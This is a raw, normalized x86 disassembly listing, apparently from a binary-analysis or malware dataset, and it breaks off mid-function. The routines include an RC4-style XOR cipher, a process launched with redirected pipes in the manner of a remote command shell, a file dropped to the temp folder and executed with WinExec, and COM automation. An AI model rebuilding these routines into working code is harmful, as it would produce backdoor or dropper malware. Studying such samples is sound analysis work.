pop esi
mov [ eax + 0x4 ] bl
mov [ eax + 0x5 ] cl
pop ebx
leave
retn
push edi
movzx edi bl
movzx eax cl
jmp r-xdata
lea ebx [ edi + 0x1 ]
and ebx 0x800000ff
jns r-xdata
movzx edi bl
lea ecx [ edi + esi ]
movzx edx [ ecx ]
add eax edx
and eax 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov [ ebp - 0x1 ] al
movzx eax al
mov [ ebp - 0xc ] eax
add eax esi
mov [ ebp - 0x10 ] eax
call sub_40cbbe
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx ]
add eax edx
mov edx [ ebp - 0x10 ]
movzx edx [ edx ]
add edx ecx
and edx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx ecx dl
mov cl [ ecx + esi ]
xor [ eax ] cl
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0xc ]
jl r-xdata
dec edx
or edx 0xffffff00
inc edx
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x1 ]
mov eax [ ebp + 0x10 ]
pop edi
sub_40ccea
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push edi
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
mov esi r--data
push esi
call sub_40f45c
mov ecx [ ebp + 0x8 ]
call sub_40ec7e
mov eax [ ebp + 0xc ]
xor ebx ebx
inc ebx
dec eax
cmp eax ebx
mov [ ebp + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + edi ] 0x0
jne r-xdata
inc ebx
cmp ebx [ ebp + 0xc ]
jl r-xdata
lea eax [ ebx + edi + 0x1 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push esi
call sub_40f45c
mov ecx [ ebp + 0x8 ]
call sub_40ec7e
sub_40cd53
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push edi
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
mov esi r--data
push esi
call sub_40f45c
mov ecx [ ebp + 0x8 ]
call sub_40ec7e
mov eax [ ebp + 0xc ]
xor ebx ebx
inc ebx
dec eax
cmp eax ebx
mov [ ebp + 0xc ] eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + edi ] 0x0
jne r-xdata
inc ebx
cmp ebx [ ebp + 0xc ]
jl r-xdata
lea eax [ ebx + edi + 0x1 ]
push eax
push eax
call sub_411738
pop ecx
push eax
sub esp 0x10
mov ecx esp
push esi
call sub_40f45c
mov ecx [ ebp + 0x8 ]
call sub_40ec7e
sub_40cdbc
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi 0x2710
push edi
call sub_411160
push 0x4
xor ebx ebx
mov esi eax
push ebx
push esi
call sub_41112d
push [ ebp + 0x10 ]
push esi
call sub_4116d8
push r--data
push esi
call sub_411657
add esp 0x20
push ebx
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_411738
pop ecx
push eax
push esi
push [ rw-data ]
call [ WriteFile@IAT ]
cmp [ rw-data ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_40f45c
jmp r-xdata
mov eax [ ebp + 0x10 ]
push 0x4
push ebx
push esi
mov [ ebp - 0x8 ] eax
call sub_41112d
add esp 0xc
push ebx
mov ebx [ ReadFile@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push edi
push esi
push [ rw-data ]
call ebx
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push esi
mov [ eax + esi ] 0x0
call sub_41188f
test eax eax
pop ecx
pop ecx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_40f609
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
push esi
mov [ eax + esi ] 0x0
call sub_41188f
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
push esi
call sub_41188f
test eax eax
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
push esi
lea ecx [ ebp - 0x1c ]
mov [ eax + esi ] 0x0
call sub_40f4c7
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40f594
lea ecx [ ebp - 0x1c ]
call sub_40f609
push r--data
push esi
call sub_41188f
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
push esi
call sub_41188f
test eax eax
pop ecx
pop ecx
jne r-xdata
push r--data
push esi
call sub_41188f
test eax eax
pop ecx
pop ecx
jne r-xdata
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push esi
push [ rw-data ]
call ebx
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push esi
push [ rw-data ]
call ebx
sub_40cf1b
push ebp
mov ebp esp
sub esp 0x54
push esi
push 0x10
xor esi esi
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_41112d
push 0x44
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_41112d
mov eax [ rw-data ]
add esp 0x18
or [ ebp - 0x28 ] 0x101
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push esi
push esi
push esi
push 0x1
push esi
push esi
push r--data
push esi
mov [ ebp - 0x54 ] 0x44
mov [ ebp - 0x24 ] si
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn
push [ ebp - 0x10 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0xc ]
call esi
xor eax eax
inc eax
sub_40cf99
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
xor eax eax
cmp [ rw-data ] ebx
jne r-xdata
pop ebx
leave
retn
inc eax
push 0xfffffff5
mov [ rw-data ] eax
mov [ ebp - 0xc ] 0xc
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ebx
call [ GetStdHandle@IAT ]
push ebx
mov [ rw-data ] eax
lea eax [ ebp - 0xc ]
push eax
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ GetCurrentProcess@IAT ]
push edi
push 0x2
push ebx
push ebx
push rw-data
call esi
push eax
push [ rw-data ]
call esi
mov edi [ DuplicateHandle@IAT ]
push eax
call edi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ rw-data ]
call [ CloseHandle@IAT ]
push ebx
lea eax [ ebp - 0xc ]
push eax
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
push 0x2
push ebx
push ebx
push rw-data
call esi
push eax
push [ rw-data ]
call esi
push eax
call edi
test eax eax
jne r-xdata
push [ rw-data ]
call [ CloseHandle@IAT ]
call sub_40cf1b
neg eax
sbb eax eax
neg eax
sub_40d076
sub esp 0x14
push ebx
push esi
mov esi [ esp + 0x20 ]
push esi
call sub_411738
mov [ esp + 0x18 ] eax
mov [ esp ] r--data
call sub_411738
xor ebx ebx
cmp [ esp + 0x18 ] ebx
pop ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0xc ] ebx
jle r-xdata
pop esi
pop ebx
add esp 0x14
retn
mov [ esp + 0x8 ] 0x5
sub [ esp + 0x8 ] esi
push ebp
push edi
and [ esp + 0x18 ] 0x0
call sub_411419
mov [ esp + 0x18 ] eax
jmp r-xdata
call [ GetTickCount@IAT ]
push 0x18
xor edx edx
pop ecx
div ecx
add dl 0x61
mov [ edi ] dl
cmp dl 0x7a
jle r-xdata
mov eax [ esp + 0x28 ]
lea esi [ ebx + eax ]
mov eax ebx
push 0x14
cdq
pop ecx
idiv ecx
lea edi [ edx + rw-data ]
call [ GetTickCount@IAT ]
mov ecx eax
mov eax [ esp + 0x10 ]
add eax esi
cdq
push 0x14
pop ebp
idiv ebp
movsx eax [ esi ]
movsx edx [ edx + rw-data ]
add edx [ esp + 0x18 ]
add edx ecx
add eax edx
xor edx edx
div [ esp + 0x20 ]
mov dl [ edx + r--data ]
cmp dl 0x61
mov [ edi ] dl
jl r-xdata
inc ebx
cmp ebx [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
jl r-xdata
dec eax
or eax 0xfffffffe
inc eax
mov eax [ esp + 0x14 ]
inc eax
and eax 0x80000001
jns r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
pop edi
pop ebp
sub_40d15c
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
xor bl bl
call sub_40ee85
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
sub esp 0x10
lea eax [ esi + 0x4 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x10 ]
push eax
call sub_40a77b
pop ecx
lea eax [ ebp - 0x10 ]
mov ecx esp
push eax
call sub_40f594
call sub_40db25
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
mov esi [ esi + 0x8 ]
push eax
push esi
call sub_40ae78
pop ecx
pop ecx
mov esi eax
inc bl
jmp r-xdata
lea ecx [ ebp - 0x10 ]
call sub_40f609
test bl bl
je r-xdata
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_40e10c
add esp 0xc
inc edi
cmp edi 0xa
mov bl al
jge r-xdata
sub_40d1e9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_40f5f9
mov ebx [ ebp + 0x14 ]
xor esi esi
test ebx ebx
jle r-xdata
lea ecx [ ebp + 0xc ]
call sub_40f609
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
push esi
lea ecx [ ebp + 0xc ]
call sub_40f627
movzx eax [ eax ]
mov ecx eax
shr ecx 0x4
and eax 0x8000000f
mov cl [ ecx + r--data ]
mov [ ebp - 0x8 ] cl
jns r-xdata
mov al [ eax + r--data ]
mov [ ebp - 0x7 ] al
push [ ebp - 0x8 ]
mov ecx edi
call sub_40f645
push [ ebp - 0x7 ]
mov ecx edi
call sub_40f645
inc esi
cmp esi ebx
jl r-xdata
dec eax
or eax 0xfffffff0
inc eax
sub_40d2a2
push ebp
lea ebp [ esp - 0x60 ]
sub esp 0x1bc
push ebx
push esi
push edi
push 0x26
call sub_411160
xor ebx ebx
cmp eax ebx
pop ecx
je r-xdata
xor esi esi
mov ecx eax
call sub_40d25b
mov esi eax
jmp r-xdata
xor eax eax
lea edi [ ebp + 0x2c ]
mov [ ebp + 0x28 ] 0x2e612e
stosb [ edi ]
mov [ ebp + 0x5f ] 0x61
lea eax [ esi + 0x1e ]
lea ebx [ esi + 0x22 ]
mov [ ebp + 0x34 ] eax
mov [ ebp + 0x30 ] ebx
lea ecx [ esi + 0x11 ]
mov edi esi
mov [ esi + 0x22 ] ebx
mov [ esi + 0x1e ] ebx
call sub_4023b8
lea ecx [ esi + 0x4 ]
mov [ esi ] ebx
call sub_4023b8
sub esp 0x10
lea eax [ ebp + 0x68 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x28 ]
push eax
call sub_40d1e9
add esp 0x14
push [ ebp + 0x78 ]
lea ecx [ ebp - 0x68 ]
call sub_40f4c7
push r--data
lea ecx [ ebp - 0x18 ]
call sub_40f45c
push r--data
lea ecx [ ebp + 0x18 ]
call sub_40f45c
sub esp 0x10
mov ebx esp
sub esp 0x10
lea eax [ ebp - 0x68 ]
mov ecx esp
push eax
call sub_40f594
push ebx
push rw-data
lea ecx [ ebp - 0x58 ]
call sub_40f4c7
mov ecx eax
call sub_40f70c
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x68 ]
call sub_40f80b
lea ecx [ ebp + 0x8 ]
call sub_40f609
lea ecx [ ebp - 0x58 ]
call sub_40f609
mov eax [ ebp - 0x20 ]
xor ecx ecx
cmp eax ecx
mov [ ebp + 0x4c ] eax
mov [ ebp + 0x48 ] ecx
mov [ ebp + 0x3c ] ecx
mov [ ebp + 0x44 ] ecx
mov [ ebp + 0x38 ] ecx
jle r-xdata
cmp [ edi + 0x1e ] 0x0
jne r-xdata
cmp [ ebp + 0x38 ] 0x0
je r-xdata
test eax eax
mov [ ebp + 0x58 ] eax
jle r-xdata
mov [ ebp + 0x58 ] ecx
jmp r-xdata
mov edi [ edi + 0x22 ]
test edi edi
jne r-xdata
mov ebx [ edi + 0x8 ]
mov [ ebp + 0x57 ] 0x61
jmp r-xdata
push [ ebp + 0x40 ]
call sub_410a7a
inc [ ebp + 0x5f ]
cmp [ ebp + 0x5f ] 0x7a
pop ecx
jl r-xdata
cmp [ ebp + 0x4c ] ecx
jle r-xdata
sub eax [ ebp + 0x58 ]
lea ecx [ ebp + 0x18 ]
mov [ ebp + 0x4c ] eax
call sub_4023b8
mov eax [ ebp + 0x58 ]
test eax eax
jle r-xdata
lea eax [ ebp + 0x28 ]
push eax
push ebx
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
push 0x64
call sub_411160
cmp [ ebp + 0x5f ] 0x5
pop ecx
mov [ ebp + 0x40 ] eax
mov edi esi
jle r-xdata
xor ebx ebx
inc ebx
mov eax [ ebp + 0x4c ]
test eax eax
mov [ ebp + 0x58 ] eax
jle r-xdata
mov [ ebp + 0x58 ] ecx
jmp r-xdata
sub esp 0x10
lea eax [ ebp + 0x18 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0xab ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_40f80b
lea ecx [ ebp - 0xab ]
call sub_40f609
mov eax [ ebp + 0x58 ]
add [ ebp + 0x44 ] eax
push 0x3c
pop ecx
mov [ ebp + 0x50 ] eax
inc [ ebp + 0x57 ]
mov al [ ebp + 0x57 ]
mov [ ebp + 0x29 ] al
mov cl [ ebp + 0x5f ]
inc cl
sub esp 0x10
mov [ eax + 0x1 ] cl
mov ecx esp
push ebx
call sub_40f4c7
lea eax [ ebp + 0x8 ]
push eax
call sub_40cdbc
push [ edi + 0x15 ]
push [ ebp + 0xc ]
call sub_41188f
add esp 0x1c
test eax eax
je r-xdata
mov edi esi
test edi edi
mov esi [ esi + 0x22 ]
je r-xdata
xor ebx ebx
cmp [ ebp + 0x4c ] ecx
jle r-xdata
mov ebx [ ebp + 0x58 ]
sub [ ebp + 0x4c ] ebx
lea ecx [ ebp + 0x18 ]
call sub_4023b8
test ebx ebx
jle r-xdata
push [ ebp + 0x48 ]
lea ecx [ ebp - 0x28 ]
call sub_40f627
movzx eax [ eax ]
push eax
lea eax [ ebp - 0xdf ]
push eax
lea ecx [ ebp + 0x18 ]
call sub_40f6ee
lea ecx [ ebp - 0xdf ]
call sub_40f609
inc [ ebp + 0x48 ]
dec [ ebp + 0x50 ]
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_40f609
xor eax eax
inc eax
mov [ edi + 0x1e ] eax
mov [ ebp + 0x38 ] eax
test esi esi
jne r-xdata
mov ecx edi
call sub_40d272
push edi
call sub_410a7a
pop ecx
mov eax [ ebp + 0x4c ]
test eax eax
mov [ ebp + 0x58 ] eax
jle r-xdata
mov [ ebp + 0x58 ] ecx
jmp r-xdata
sub esp 0x10
mov ebx esp
sub esp 0x10
lea eax [ ebp + 0x18 ]
mov ecx esp
push eax
call sub_40f594
push ebx
sub esp 0x10
lea eax [ ebp - 0x18 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x113 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_40f70c
mov ecx eax
call sub_40f70c
lea eax [ ebp - 0xc5 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_40f80b
lea ecx [ ebp - 0xc5 ]
call sub_40f609
lea ecx [ ebp - 0x113 ]
call sub_40f609
mov eax [ ebp + 0x58 ]
add [ ebp + 0x44 ] eax
mov ebx [ ebp + 0x30 ]
push 0x3c
pop ecx
push [ ebp + 0x48 ]
lea ecx [ ebp - 0x28 ]
call sub_40f627
movzx eax [ eax ]
push eax
lea eax [ ebp - 0x12d ]
push eax
lea ecx [ ebp + 0x18 ]
call sub_40f6ee
lea ecx [ ebp - 0x12d ]
call sub_40f609
inc [ ebp + 0x48 ]
dec ebx
jne r-xdata
cmp [ esi + 0x1e ] 0x0
jne r-xdata
lea ecx [ ebp + 0x18 ]
call sub_40f609
lea ecx [ ebp - 0x18 ]
call sub_40f609
lea ecx [ ebp - 0x68 ]
call sub_40f609
lea ecx [ ebp - 0x28 ]
call sub_40f609
lea ecx [ ebp + 0x68 ]
call sub_40f609
pop edi
pop esi
mov eax ebx
pop ebx
add ebp 0x60
leave
retn
push [ ebp + 0x40 ]
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_4115cd
push ecx
lea eax [ ebp - 0x68 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp + 0x8 ]
push eax
sub esp 0x10
lea eax [ ebp - 0x18 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x9e ]
push eax
sub esp 0x10
lea eax [ ebp - 0x15c ]
mov ecx esp
push eax
call sub_40f4c7
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_40f70c
mov ecx eax
call sub_40f70c
mov ecx eax
call sub_40f70c
lea ecx [ ebp - 0x9e ]
call sub_40f609
lea ecx [ ebp - 0xb8 ]
call sub_40f609
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_40f70c
push [ ebp + 0x78 ]
and [ ebp + 0x58 ] 0x0
call sub_411738
and [ ebp + 0x50 ] 0x0
pop ecx
mov ecx [ ebp - 0x30 ]
sub ecx eax
test ecx ecx
mov [ ebp + 0x40 ] eax
jle r-xdata
mov ebx [ ebp + 0x58 ]
sub [ ebp + 0x4c ] ebx
lea ecx [ ebp + 0x18 ]
call sub_4023b8
test ebx ebx
jle r-xdata
push [ ebp + 0x58 ]
lea eax [ ebp - 0x84 ]
push r--data
push eax
call sub_4115cd
add esp 0xc
lea ecx [ ebp - 0x78 ]
call sub_40f5f9
sub esp 0x10
lea eax [ ebp - 0x38 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x48 ]
push eax
sub esp 0x10
mov ecx esp
push r--data
call sub_40f45c
lea eax [ ebp - 0xd2 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0xec ]
call sub_40f4c7
mov ecx eax
call sub_40f70c
mov ecx eax
call sub_40f70c
lea ecx [ ebp - 0xd2 ]
call sub_40f609
lea ecx [ ebp - 0xec ]
call sub_40f609
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
push [ ebp + 0x50 ]
lea ecx [ ebp - 0x38 ]
call sub_40f627
movsx eax [ eax ]
add [ ebp + 0x58 ] eax
mov eax [ ebp - 0x30 ]
sub eax [ ebp + 0x40 ]
inc [ ebp + 0x50 ]
cmp [ ebp + 0x50 ] eax
jl r-xdata
sub esp 0x10
mov ebx esp
sub esp 0x10
lea eax [ ebp + 0x18 ]
mov ecx esp
push eax
call sub_40f594
push ebx
sub esp 0x10
lea eax [ ebp - 0x18 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0xf9 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_40f70c
mov ecx eax
call sub_40f70c
lea eax [ ebp - 0x147 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_40f80b
lea ecx [ ebp - 0x147 ]
call sub_40f609
lea ecx [ ebp - 0xf9 ]
call sub_40f609
mov eax [ ebp + 0x58 ]
add [ ebp + 0x44 ] eax
mov ebx [ ebp + 0x30 ]
push [ ebp + 0x48 ]
lea ecx [ ebp - 0x28 ]
call sub_40f627
movzx eax [ eax ]
push eax
lea eax [ ebp - 0x91 ]
push eax
lea ecx [ ebp + 0x18 ]
call sub_40f6ee
lea ecx [ ebp - 0x91 ]
call sub_40f609
inc [ ebp + 0x48 ]
dec ebx
jne r-xdata
sub esp 0x10
lea eax [ ebp - 0x48 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x58 ]
push eax
call sub_40cdbc
add [ ebp + 0x58 ] 0x2710
push 0x64
call sub_411160
mov [ ebp + 0x50 ] eax
mov eax [ ebp + 0x58 ]
cdq
mov ecx 0xff
idiv ecx
push [ ebp + 0x7c ]
push edx
push eax
push r--data
push [ ebp + 0x50 ]
call sub_4115cd
add esp 0x1c
lea eax [ ebp - 0x48 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ edi + 0x4 ]
call sub_40f80b
lea ecx [ ebp - 0x120 ]
call sub_40f609
mov eax [ ebp + 0x34 ]
and [ eax ] 0x0
mov eax [ ebp + 0x3c ]
push [ ebp + 0x50 ]
and [ ebx ] 0x0
mov [ edi ] eax
lea eax [ ebp - 0x13a ]
push eax
lea ecx [ edi + 0x11 ]
call sub_40f785
lea ecx [ ebp - 0x13a ]
call sub_40f609
push [ ebp + 0x50 ]
push [ ebp - 0x54 ]
call sub_41188f
test eax eax
pop ecx
pop ecx
je r-xdata
sub esp 0x10
lea eax [ ebp - 0x48 ]
mov ecx esp
push eax
call sub_40f594
lea eax [ ebp - 0x106 ]
push eax
lea ecx [ ebp - 0x78 ]
call sub_40f80b
lea ecx [ ebp - 0x106 ]
call sub_40f609
push 0x26
call sub_411160
test eax eax
pop ecx
je r-xdata
mov ecx [ ebp + 0x34 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov [ ebp + 0x38 ] eax
xor eax eax
mov ecx eax
call sub_40d25b
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_40f5f9
mov eax [ ebp + 0x44 ]
cdq
sub eax edx
sar eax 0x1
push 0x3c
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x4c ]
pop ecx
cmp eax ecx
jle r-xdata
push [ ebp + 0x50 ]
mov [ ebx ] eax
mov edi eax
lea eax [ edi + 0x1e ]
lea ebx [ edi + 0x22 ]
and [ ebx ] 0x0
inc [ ebp + 0x3c ]
mov [ ebp + 0x34 ] eax
mov [ eax ] 0x1
mov [ ebp + 0x30 ] ebx
call sub_410a7a
pop ecx
lea ecx [ ebp - 0x58 ]
call sub_40f609
lea ecx [ ebp - 0x48 ]
call sub_40f609
lea ecx [ ebp - 0x78 ]
call sub_40f609
lea ecx [ ebp - 0x38 ]
call sub_40f609
lea ecx [ ebp + 0x8 ]
call sub_40f609
lea ecx [ ebp - 0x8 ]
call sub_40f609
cmp [ ebp + 0x4c ] 0x0
jg r-xdata
sub_40d962
push esi
push edi
call sub_40cf99
push r--data
push r--data
sub esp 0x10
lea eax [ esp + 0x24 ]
mov ecx esp
push eax
call sub_40f594
call sub_40d2a2
add esp 0x18
push r--data
push r--data
sub esp 0x10
mov edi eax
lea eax [ esp + 0x24 ]
mov ecx esp
push eax
call sub_40f594
call sub_40d2a2
mov esi eax
add esp 0x18
lea ecx [ esp + 0xc ]
or esi edi
call sub_40f609
pop edi
mov eax esi
pop esi
retn
sub_40d9c2
push ebp
mov ebp esp
sub esp 0x4f4
inc [ rw-data ]
cmp [ rw-data ] 0x1
jg r-xdata
leave
retn
push esi
push edi
push 0x1a
pop ecx
mov esi r--data
lea edi [ ebp - 0x2ec ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x6
pop ecx
mov esi r--data
lea edi [ ebp - 0x1c ]
[ edi ] [ esi ]
lea eax [ ebp - 0x2ec ]
push eax
lea eax [ ebp - 0x17c ]
push eax
movsw [ edi ] [ esi ]
call sub_4116d8
push [ ebp + 0x8 ]
lea eax [ ebp - 0x17c ]
push eax
call sub_411657
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x17c ]
push eax
call sub_411657
push 0x17
pop ecx
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x17c ]
mov esi r--data
lea edi [ ebp - 0x78 ]
push eax
[ edi ] [ esi ]
call sub_411657
mov esi 0x104
push esi
xor edi edi
lea eax [ ebp - 0x280 ]
push edi
push eax
call sub_41112d
push esi
lea eax [ ebp - 0x3f0 ]
push edi
push eax
call sub_41112d
add esp 0x38
lea eax [ ebp - 0x3f0 ]
push eax
push esi
call [ GetTempPathA@IAT ]
test eax eax
jbe r-xdata
pop edi
pop esi
lea eax [ ebp - 0x280 ]
push eax
push 0x5
push r--data
lea eax [ ebp - 0x3f0 ]
push eax
call [ GetTempFileNameA@IAT ]
test eax eax
jbe r-xdata
lea eax [ ebp - 0x280 ]
push r--data
push eax
call sub_410c4c
mov esi eax
cmp esi edi
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x17c ]
push eax
push esi
call sub_410c5f
push esi
call sub_410b53
lea eax [ ebp - 0x4f4 ]
push r--data
push eax
call sub_4116d8
lea eax [ ebp - 0x280 ]
push eax
lea eax [ ebp - 0x4f4 ]
push eax
call sub_411657
add esp 0x1c
push edi
lea eax [ ebp - 0x4f4 ]
push eax
call [ WinExec@IAT ]
push 0x64
call [ Sleep@IAT ]
lea eax [ ebp - 0x280 ]
push eax
call sub_4114c1
pop ecx
sub_40db25
push ebp
lea ebp [ esp - 0x68 ]
sub esp 0xca4
push ebx
xor ebx ebx
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x5c ] ebx
mov [ ebp + 0x4c ] ebx
call sub_40f45c
lea eax [ ebp + 0x70 ]
push eax
lea ecx [ ebp + 0x34 ]
call sub_40f594
cmp [ ebp + 0x78 ] 0x4
jge r-xdata
push esi
lea eax [ ebp - 0x3c ]
push eax
call [ GetSystemTime@IAT ]
mov esi [ ebp + 0x24 ]
dec esi
cmp esi ebx
jl r-xdata
lea ecx [ ebp + 0x34 ]
call sub_40f609
lea ecx [ ebp + 0x1c ]
call sub_40f609
lea ecx [ ebp + 0x70 ]
call sub_40f609
mov eax ebx
pop ebx
add ebp 0x68
leave
retn
call sub_40b02e
test al al
jne r-xdata
push esi
lea ecx [ ebp + 0x1c ]
call sub_40f627
movzx eax [ eax ]
push eax
push ebx
lea ecx [ ebp + 0x34 ]
call sub_40f866
dec esi
jns r-xdata
cmp [ rw-data ] ebx
mov esi [ LockSetForegroundWindow@IAT ]
jg r-xdata
push r--data
call sub_40d9c2
pop ecx
push 0x1
mov [ ebp + 0x64 ] ebx
call esi
lea eax [ ebp + 0x64 ]
push eax
push r--data
push 0x4
push ebx
push r--data
call [ CoCreateInstance@IAT ]
push 0x2
call esi
cmp [ ebp + 0x64 ] ebx
je r-xdata
inc [ rw-data ]
push 0x1
call esi
push ebx
call [ OleInitialize@IAT ]
push 0x2
call esi
mov ebx [ ebp + 0x5c ]
pop esi
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
call [ VariantInit@IAT ]
call sub_40b02e
test al al
je r-xdata
push [ rw-data ]
push [ rw-data ]
jmp r-xdata
cmp [ ebp + 0x24 ] ebx
push edi
jle r-xdata
cmp [ ebp + 0x3c ] ebx
mov [ ebp + 0x60 ] ebx
jle r-xdata
call [ SysAllocString@IAT ]
push r--data
mov [ ebp + 0x58 ] eax
call [ SysAllocString@IAT ]
mov [ ebp + 0x30 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x3c ]
mov [ ebp + 0x14 ] eax
lea eax [ ebp + 0x14 ]
push eax
push 0x1
push 0x11
mov [ ebp - 0xc ] 0x8
mov [ ebp + 0x4 ] 0x2000
mov [ ebp + 0x18 ] ebx
call [ SafeArrayCreate@IAT ]
mov [ ebp + 0xc ] eax
call sub_40b02e
test al al
jne r-xdata
push 0x1
call esi
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x80 ]
push [ ebp + 0x58 ]
mov edi [ SysFreeString@IAT ]
call edi
push [ ebp + 0x30 ]
call edi
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push 0x2
call esi
pop edi
cmp [ ebp + 0x3c ] ebx
jle r-xdata
push [ ebp + 0x60 ]
lea ecx [ ebp + 0x34 ]
call sub_40f627
push eax
lea eax [ ebp + 0x60 ]
push eax
push [ ebp + 0xc ]
call [ SafeArrayPutElement@IAT ]
inc [ ebp + 0x60 ]
mov eax [ ebp + 0x60 ]
cmp eax [ ebp + 0x3c ]
jl r-xdata
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xa4 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xe8 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc4 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0x110 ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xac ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xbc ]
mov eax [ ebp + 0x64 ]
mov ecx [ eax ]
push 0xffffffff
push eax
call [ ecx + 0xf0 ]
mov edi [ WideCharToMultiByte@IAT ]
cmp [ rw-data ] bl
je r-xdata
mov [ ebp + 0x60 ] ebx
mov [ ebp + 0x54 ] ebx
lea eax [ ebp - 0x1c ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x32 ]
imul eax eax 0x64
